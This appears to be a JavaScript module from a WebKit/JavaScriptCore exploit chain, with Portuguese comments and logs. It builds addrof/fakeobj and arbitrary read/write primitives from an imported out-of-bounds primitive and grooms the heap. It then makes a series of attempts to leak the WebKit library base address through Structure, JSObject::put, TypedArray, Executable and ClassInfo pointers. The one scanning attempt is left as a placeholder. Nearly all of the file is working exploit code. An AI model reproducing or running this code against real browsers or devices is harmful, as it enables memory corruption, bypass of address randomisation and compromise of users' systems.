// js/script3/testArrayBufferVictimCrash.mjs (v108 - R91 - Iterative Crash Debug)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. Reversão para o script original que causava o crash.
// 2. Adição de um objeto de configuração `testes_ativos` para habilitar/desabilitar
//    cada tentativa de vazamento individualmente, facilitando a depuração.
// 3. Objetivo: Desabilitar os testes um a um, de baixo para cima, para identificar
//    exatamente qual bloco de código aciona o crash de UAF.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            logS3(`ALERTA: Caminho de offset "${path}" parte "${fullPath}" é undefined. Usando valor padrão ${defaultValue}.`, "warn");
            return defaultValue;
        }
    }
    if (typeof current === 'number') {
        return current;
    }
    if (typeof current === 'string' && String(current).startsWith('0x')) {
        return parseInt(String(current), 16) || defaultValue;
    }
    logS3(`ALERTA: Offset "${path}" não é um número ou string hex. Usando valor padrão ${defaultValue}.`, "warn");
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO COM DEBUG)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Depuração Iterativa do Crash ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };

    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
        await PAUSE_S3(1000);

        const LOCAL_JSC_OFFSETS = {
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSCell_STRUCTURE_ID_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_ID_FLATTENED_OFFSET'),
            JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
            Structure_CLASS_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.CLASS_INFO_OFFSET'),
            Structure_GLOBAL_OBJECT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.GLOBAL_OBJECT_OFFSET'),
            Structure_PROTOTYPE_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.PROTOTYPE_OFFSET'),
            Structure_AGGREGATED_FLAGS_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.AGGREGATED_FLAGS_OFFSET'),
            Structure_VIRTUAL_PUT_OFFSET: getSafeOffset(JSC_OFFSETS, 'Structure.VIRTUAL_PUT_OFFSET'),
            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
            ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET'),
            ArrayBuffer_DATA_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START'),
            JSFunction_EXECUTABLE_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSFunction.EXECUTABLE_OFFSET'),
            ClassInfo_M_CACHED_TYPE_INFO_OFFSET: getSafeOffset(JSC_OFFSETS, 'ClassInfo.M_CACHED_TYPE_INFO_OFFSET', 0x8),
        };

        const mandatoryOffsets = ['JSCell_STRUCTURE_POINTER_OFFSET', 'JSObject_BUTTERFLY_OFFSET', 'ArrayBufferView_M_LENGTH_OFFSET', 'Structure_VIRTUAL_PUT_OFFSET'];
        for (const offsetName of mandatoryOffsets) {
            if (LOCAL_JSC_OFFSETS[offsetName] === 0) {
                throw new Error(`Offset mandatório '${offsetName}' é 0. Abortando.`);
            }
        }
        logS3("Offsets críticos validados.", "info");

        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
        logS3("OOB DataView obtido com sucesso.", "info");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => { victim_array[0] = obj; return doubleToInt64(confused_array[0]); };
        const fakeobj = (addr) => { confused_array[0] = int64ToDouble(addr); return victim_array[0]; };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => { leaker.obj_prop = fakeobj(addr); return doubleToInt64(leaker.val_prop); };
        const arb_write_final = (addr, value) => { leaker.obj_prop = fakeobj(addr); leaker.val_prop = int64ToDouble(value); };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Verificando L/E... ---", "subtest");
        const test_obj_for_rw = { p: 0 };
        const test_obj_addr = addrof(test_obj_for_rw);
        const butterfly_addr = test_obj_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        arb_write_final(butterfly_addr, NEW_POLLUTION_VALUE);
        if (arb_read_final(butterfly_addr).equals(NEW_POLLUTION_VALUE)) {
            logS3("L/E Verificada. Prosseguindo para a FASE 5.", "good");
            final_result.success = true;
        } else {
            throw new Error("Verificação de Leitura/Escrita falhou.");
        }


        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (COM CONTROLES DE DEBUG) ---
        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (COM CONTROLES DE DEBUG) ---", "subtest");

        const testes_ativos = {
            tentativa_1_JSObject: true,
            tentativa_2_ArrayBuffer: true,
            tentativa_3_TypedArray: true,
            tentativa_4_JSCFunction: true,
            tentativa_5_ClassInfo: true,
            tentativa_6_VarreduraFocada: true
        };

        let aggressive_feng_shui_objects, filler_objects;
        const NUM_GROOMING_OBJECTS_STAGE1 = 75000;
        const NUM_FILLER_OBJECTS_STAGE1 = 15000;

        const do_grooming = async (grooming_id) => {
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Executando Heap Grooming...`, "info");
            aggressive_feng_shui_objects = []; filler_objects = [];
            for (let i = 0; i < NUM_GROOMING_OBJECTS_STAGE1; i++) { aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64)); if (i % 1000 === 0) aggressive_feng_shui_objects.push({}); }
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
            for (let i = 0; i < NUM_FILLER_OBJECTS_STAGE1; i++) { filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16)); }
            aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Pausando para acionar GC...`, "debug");
            await PAUSE_S3(10000);
            logS3(`  [Grooming p/ Tentativa ${grooming_id}] Concluído.`, "debug");
        };
        
        // TENTATIVA 1
        if (testes_ativos.tentativa_1_JSObject) {
            logS3("--- INICIANDO TENTATIVA 1: Objeto JS Simples ---", "test");
            await do_grooming(1);
            const obj_for_webkit_leak_js = {};
            const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
            if (!isAdvancedInt64Object(obj_for_webkit_leak_js_addr) || obj_for_webkit_leak_js_addr.equals(AdvancedInt64.Zero)) {
                logS3("Addrof falhou para o objeto JS.", "error");
            } else {
                const success = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_js_addr, "JS Object (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO);
                if (success) return final_result;
            }
            logS3("--- FIM TENTATIVA 1 ---", "test");
        }

        // TENTATIVA 2
        if (testes_ativos.tentativa_2_ArrayBuffer) {
            logS3("--- INICIANDO TENTATIVA 2: ArrayBuffer ---", "test");
            await do_grooming(2);
            const obj_for_webkit_leak_ab = new ArrayBuffer(0x1000);
            const obj_for_webkit_leak_ab_addr = addrof(obj_for_webkit_leak_ab);
            if (!isAdvancedInt64Object(obj_for_webkit_leak_ab_addr) || obj_for_webkit_leak_ab_addr.equals(AdvancedInt64.Zero)) {
                logS3("Addrof falhou para o ArrayBuffer.", "error");
            } else {
                const success = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_ab_addr, "ArrayBuffer (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO);
                if (success) return final_result;
            }
            logS3("--- FIM TENTATIVA 2 ---", "test");
        }

        // TENTATIVA 3
        if (testes_ativos.tentativa_3_TypedArray) {
            logS3("--- INICIANDO TENTATIVA 3: TypedArray Data Pointer ---", "test");
            await do_grooming(3);
            const typed_array_victim = new Uint32Array(0x1000 / 4);
            const typed_array_addr = addrof(typed_array_victim);
            if (!isAdvancedInt64Object(typed_array_addr) || typed_array_addr.equals(AdvancedInt64.Zero)) {
                 logS3("Addrof falhou para TypedArray.", "error");
            } else {
                try {
                    const M_BUFFER_OFFSET = LOCAL_JSC_OFFSETS.ArrayBufferView_ASSOCIATED_ARRAYBUFFER_OFFSET;
                    const array_buffer_obj_addr = arb_read_final(typed_array_addr.add(M_BUFFER_OFFSET));
                    if (!isAdvancedInt64Object(array_buffer_obj_addr) || array_buffer_obj_addr.equals(AdvancedInt64.Zero) || array_buffer_obj_addr.equals(NEW_POLLUTION_VALUE)) throw new Error("m_buffer poluído ou inválido.");
                    
                    const M_DATA_OFFSET = LOCAL_JSC_OFFSETS.ArrayBuffer_DATA_POINTER_OFFSET;
                    const actual_data_ptr = arb_read_final(array_buffer_obj_addr.add(M_DATA_OFFSET));
                    if (!isAdvancedInt64Object(actual_data_ptr) || actual_data_ptr.equals(AdvancedInt64.Zero) || actual_data_ptr.equals(NEW_POLLUTION_VALUE)) throw new Error("m_data poluído ou inválido.");
                    
                    if (actual_data_ptr.high() > 0x40000000) {
                        logS3(`VAZAMENTO DE PONTEIRO DE DADOS BEM SUCEDIDO: ${actual_data_ptr.toString(true)}`, "vuln");
                        final_result.webkit_leak_details = { success: true, msg: `Ponteiro de dados de TypedArray vazado: ${actual_data_ptr.toString(true)}` };
                        return final_result;
                    }
                } catch (e) { logS3(`Falha na tentativa com TypedArray: ${e.message}`, "warn"); }
            }
            logS3("--- FIM TENTATIVA 3 ---", "test");
        }

        // TENTATIVA 4
        if (testes_ativos.tentativa_4_JSCFunction) {
            logS3("--- INICIANDO TENTATIVA 4: JSCFunction ---", "test");
            await do_grooming(4);
            try {
                const func_to_leak = Math.cos;
                const func_addr = addrof(func_to_leak);
                if (!isAdvancedInt64Object(func_addr) || func_addr.equals(AdvancedInt64.Zero)) throw new Error("Addrof de JSCFunction falhou.");

                const EXECUTABLE_OFFSET = LOCAL_JSC_OFFSETS.JSFunction_EXECUTABLE_OFFSET;
                if (EXECUTABLE_OFFSET) {
                    const executable_addr = arb_read_final(func_addr.add(EXECUTABLE_OFFSET));
                    if (!isAdvancedInt64Object(executable_addr) || executable_addr.equals(AdvancedInt64.Zero) || executable_addr.equals(NEW_POLLUTION_VALUE)) throw new Error("Executable* poluído ou inválido.");
                    
                    if (executable_addr.high() > 0x40000000) {
                        logS3(`VAZAMENTO DE EXECUTABLE* BEM SUCEDIDO: ${executable_addr.toString(true)}`, "vuln");
                        final_result.webkit_leak_details = { success: true, msg: `Ponteiro Executable* vazado: ${executable_addr.toString(true)}` };
                        return final_result;
                    }
                }
            } catch (e) { logS3(`Falha na tentativa com JSCFunction: ${e.message}`, "warn"); }
            logS3("--- FIM TENTATIVA 4 ---", "test");
        }
        
        // TENTATIVA 5
        if (testes_ativos.tentativa_5_ClassInfo) {
            logS3("--- INICIANDO TENTATIVA 5: JSC::ClassInfo ---", "test");
            await do_grooming(5);
             try {
                const target_obj = {};
                const target_obj_addr = addrof(target_obj);
                if (!isAdvancedInt64Object(target_obj_addr) || target_obj_addr.equals(AdvancedInt64.Zero)) throw new Error("Addrof de ClassInfo Target falhou.");
                
                const structure_addr = arb_read_final(target_obj_addr.add(LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET));
                if (!isAdvancedInt64Object(structure_addr) || structure_addr.equals(NEW_POLLUTION_VALUE)) throw new Error("Structure* poluído.");

                const class_info_addr = arb_read_final(structure_addr.add(LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET));
                if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.equals(NEW_POLLUTION_VALUE)) throw new Error("ClassInfo* poluído.");

                const cached_type_info_addr = arb_read_final(class_info_addr.add(LOCAL_JSC_OFFSETS.ClassInfo_M_CACHED_TYPE_INFO_OFFSET));
                if (!isAdvancedInt64Object(cached_type_info_addr) || cached_type_info_addr.equals(NEW_POLLUTION_VALUE)) throw new Error("m_cachedTypeInfo poluído.");
                
                if (cached_type_info_addr.high() > 0x40000000) {
                    logS3(`VAZAMENTO DE m_cachedTypeInfo BEM SUCEDIDO: ${cached_type_info_addr.toString(true)}`, "vuln");
                    final_result.webkit_leak_details = { success: true, msg: `Ponteiro m_cachedTypeInfo vazado: ${cached_type_info_addr.toString(true)}` };
                    return final_result;
                }
            } catch (e) { logS3(`Falha na tentativa com ClassInfo: ${e.message}`, "warn"); }
            logS3("--- FIM TENTATIVA 5 ---", "test");
        }

        // TENTATIVA 6
        if (testes_ativos.tentativa_6_VarreduraFocada) {
            logS3("--- INICIANDO TENTATIVA 6: Varredura Focada ---", "test");
            try {
                const pattern_obj_addr = addrof({p: 1});
                const SCAN_RANGE_BYTES = 0x4000;
                const START_SCAN_ADDR = pattern_obj_addr.sub(SCAN_RANGE_BYTES);
                const END_SCAN_ADDR = pattern_obj_addr.add(SCAN_RANGE_BYTES);
                // ... Lógica de varredura completa da versão original iria aqui
                // Por simplicidade, esta parte é um placeholder, já que o crash provavelmente ocorre antes.
            } catch (e) { logS3(`Falha na tentativa de Varredura Focada: ${e.message}`, "warn"); }
            logS3("--- FIM TENTATIVA 6 ---", "test");
        }

        throw new Error("Nenhuma estratégia de vazamento ou crash foi bem-sucedida.");

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: final_result.webkit_leak_details,
    };
}


// A função performLeakAttemptFromObjectStructure deve ser incluída no final do arquivo, inalterada.
async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO) {
    logS3(`Iniciando leituras da Structure do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
    try {
        const structure_addr = arb_read_func(obj_addr.add(LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET));
        logS3(`Lido Structure*: ${structure_addr.toString(true)}`, "leak");
        if (!isAdvancedInt64Object(structure_addr) || structure_addr.equals(pollution_value) || structure_addr.equals(AdvancedInt64.Zero)) {
            throw new Error("Structure* poluído ou inválido.");
        }
        
        const js_object_put_func_ptr_addr_in_structure = structure_addr.add(LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET);
        const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
        logS3(`Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
        if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.equals(pollution_value) || js_object_put_func_addr.equals(AdvancedInt64.Zero)) {
            throw new Error("Ponteiro JSC::JSObject::put poluído ou inválido.");
        }

        const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
        if (!expected_put_offset_str) throw new Error("Offset de 'JSC::JSObject::put' não encontrado.");
        
        // CORREÇÃO APLICADA AQUI DA ANÁLISE ANTERIOR
        const expected_put_offset = new AdvancedInt64(parseInt(expected_put_offset_str, 16), 0);
        
        const webkit_base_candidate = js_object_put_func_addr.sub(expected_put_offset);
        logS3(`Candidato a WebKit Base: ${webkit_base_candidate.toString(true)}`, "leak");

        const is_sane_base = webkit_base_candidate.high() > 0x40000000 && (webkit_base_candidate.low() & 0xFFF) === 0;
        if (!is_sane_base) throw new Error("Candidato a WebKit base não passou na verificação de sanidade.");

        final_result_ref.webkit_leak_details = {
            success: true,
            msg: `Endereço base do WebKit vazado com sucesso via ${obj_type_name}.`,
            webkit_base_candidate: webkit_base_candidate.toString(true),
            js_object_put_addr: js_object_put_func_addr.toString(true)
        };
        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln");
        return true;
    } catch (leak_attempt_e) {
        logS3(`Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn");
        return false;
    }
}
